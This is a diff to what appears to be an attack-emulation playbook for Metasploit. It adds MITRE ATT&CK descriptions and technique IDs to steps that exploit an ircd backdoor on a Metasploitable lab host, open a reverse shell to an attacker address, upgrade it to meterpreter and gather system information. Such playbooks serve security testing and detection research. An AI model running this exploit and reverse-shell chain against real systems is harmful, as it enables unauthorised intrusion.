@@ -29,11 +29,19 @@ commands:
       LPORT: $LPORT
     options:
       RHOSTS: $METASPLOITABLE
+    metadata:
+      description: "Exploit backdoor in ircd to gain shell access"
+      techniques: "T1190,T1059.004,T1195.002"
+      tactics: "Initial Access,Execution"
 
   # Execute unix-command 'id' via reverse-shell
   - type: msf-session
     session: shell
     cmd: id
+    metadata:
+      description: "Verify shell access and check current user"
+      techniques: "T1033"
+      tactics: "Discovery"
 
   # Upgrade reverse-shell to meterpreter-shell
   - type: msf-module
@@ -45,9 +53,16 @@ commands:
     payload_options:
       LHOST: $ATTACKER
       LPORT: "4433"
+    metadata:
+      description: "Upgrade shell to meterpreter shell"
 
   # Execute meterpreter-command 'sysinfo'
   - type: msf-session
     session: upgraded
     stdapi: True
     cmd: sysinfo
+    metadata:
+      description: "Retrieve system information"
+      techniques: "T1082"
+      tactics: "Discovery"
+
